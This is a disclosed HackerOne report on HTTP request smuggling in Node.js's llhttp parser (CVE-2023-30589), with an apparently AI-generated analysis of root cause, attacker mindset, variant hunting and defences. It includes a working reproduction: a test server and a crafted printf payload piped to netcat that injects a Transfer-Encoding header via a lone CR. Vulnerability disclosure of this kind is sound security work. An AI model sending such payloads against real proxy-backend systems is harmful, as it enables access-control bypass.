# HTTP Request Smuggling via Empty headers separated by CR

## Metadata
- **Source:** HackerOne
- **Report:** 2032842 | https://hackerone.com/reports/2032842
- **Submitted:** 2023-06-21
- **Reporter:** yadhukrishnam
- **Program:** Node.js
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** HTTP Request Smuggling, RFC 7230 Non-Compliance, Header Parsing Bypass, Request Desynchronization
- **CVEs:** CVE-2023-30589
- **Category:** uncategorised

## Summary
The llhttp parser in Node.js v20.2.0 incorrectly accepts CR (carriage return) alone as a header delimiter instead of requiring the RFC 7230-compliant CRLF (carriage return + line feed) sequence. This allows attackers to craft HTTP requests where a header value containing CR is parsed as multiple separate headers, enabling HTTP Request Smuggling attacks between frontend proxies and backend servers that have different interpretations of the request.

## Attack scenario
1. Attacker crafts an HTTP request with a header field containing an embedded CR character followed by a valid HTTP header (e.g., 'X-Abc: \r' followed by 'Transfer-Encoding: chunked')
2. Frontend proxy receives the request and does not interpret CR as a header terminator, treating the entire sequence as a single header value
3. Frontend proxy forwards the request to the backend server with the original payload intact
4. Backend server running vulnerable llhttp parser interprets the CR as a header field terminator, parsing 'Transfer-Encoding: chunked' as a separate header
5. The backend server's request interpretation diverges from the frontend proxy's interpretation, creating a desynchronization
6. Attacker's smuggled request (e.g., chunked body content 'A') is processed by the backend as part of a different HTTP request or as a separate request, bypassing access controls

## Root cause
The llhttp parser deviates from RFC 7230 Section 3 by accepting a single CR character as sufficient to delimit HTTP header fields, instead of requiring the strict CRLF sequence. This permissive parsing allows crafted headers to be interpreted differently by compliant and non-compliant parsers in the request processing chain.

## Attacker mindset
An attacker would exploit this by identifying HTTP infrastructures where a non-compliant frontend proxy forwards requests to a vulnerable backend. By injecting a CR character within a header value, the attacker can cause the backend to parse headers differently, injecting new headers (like Transfer-Encoding) that alter request processing, ultimately smuggling malicious payloads to perform unauthorized actions or access restricted resources.

## Defensive takeaways
- Strictly implement RFC 7230 header delimiter validation requiring CRLF (\r\n) sequences only
- Reject HTTP requests containing CR (\r) characters outside of the valid CRLF delimiter context
- Implement comprehensive test coverage for invalid header parsing scenarios, including CR-only delimiters
- Add security tests to verify that single CR characters in header values are properly rejected
- Perform differential testing between HTTP parsers in the same infrastructure to detect parsing desynchronization
- Apply defense-in-depth by validating request consistency at multiple layers (proxy and backend)
- Monitor for HTTP smuggling attack patterns, particularly those involving unusual header delimiters
- Update llhttp and Node.js to patched versions that strictly enforce RFC 7230 compliance

## Variant hunting
Hunt for similar CR/CRLF confusion vulnerabilities in other HTTP parsers (nginx, Apache, IIS, Python http.server, Go net/http, etc.). Look for parser implementations that accept CR, LF, or CRLF interchangeably rather than strict CRLF. Test for header injection by inserting CR characters in header values before known headers and observing if they are parsed as separate headers. Check for other delimiters that might be accepted non-compliantly (null bytes, spaces, multiple spaces, etc.).

## MITRE ATT&CK
- T1190
- T1059
- T1021
- T1547

## Notes
This vulnerability is particularly dangerous because it creates request desynchronization between different components in an HTTP pipeline. The attacker does not directly control the backend parser but exploits the difference in interpretation between frontend and backend. Similar to CVE-2023-39615 and related HTTP smuggling variants. The vulnerability was originally reported in a related ticket (report #2001873) and highlights the importance of strict RFC compliance in HTTP parsers to prevent security bypasses in multi-layer architectures.

## Full report
<details><summary>Expand</summary>

This report was originally submitted here: https://hackerone.com/reports/2001873

---


**Summary:** 
The `llhttp` parser in the http module in Node v20.2.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).

**Description:** 
The CR character (without LF) is sufficient to delimit HTTP header fields in the llhttp parser. According to RFC7230 section 3, only the CRLF sequence should delimit each header-field.

## Steps To Reproduce:

*Server:*
```javascript
const http = require("http");
http
  .createServer((request, response) => {
    let body = [];
    request
      .on("error", (err) => {
        response.end("Request Error: " + err);
      })
      .on("data", (chunk) => {
        body.push(chunk);
      })
      .on("end", () => {
        body = Buffer.concat(body).toString();
        // log the body to stdout to catch the smuggled request
        console.log("Response");
        console.log(request.headers);
        console.log(body);
        console.log("---");
        response.on("error", (err) => {
          // log the body to stdout to catch the smuggled request
          response.end("Response Error: " + err);
        });
        response.end(
          "Body length: " + body.length.toString() + " Body: " + body
        );
      });
  })
  .listen(5000);
```
*Payload:*
1. Execute the below command.
```shell
printf "POST / HTTP/1.1\r\n"\
             "Host: localhost:5000\r\n"\
             "X-Abc:\rxTransfer-Encoding: chunked\r\n"\
             "\r\n"\
             "1\r\n"\
             "A\r\n"\
             "0\r\n"\
             "\r\n" | nc localhost 5000
```
2. Note that the value of `X-Abc` header in the request is - `[\r]xTransfer-Encoding: chunked[\r\n]`
3. The llhttp library parses this as a `Transfer-Encoding: chunked` header.
```
Response
{ host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' }
A
---
```
*Note:*
1. The next character to `\r` is missing in the parsed header name.
2.  This test case is missing from https://github.com/nodejs/llhttp/blob/main/test/request/invalid.md.
A frontend proxy that does not consider `\r` as termination of an HTTP header value, could forward this to a backend, causing an HRS. 

## Supporting Material/References:
This report is similar to:
  * https://hackerone.com/reports/1888760

## Impact

HTTP Request Smuggling can lead to Access Control Bypass

</details>

---
*Analysed by Claude on 2026-05-24*
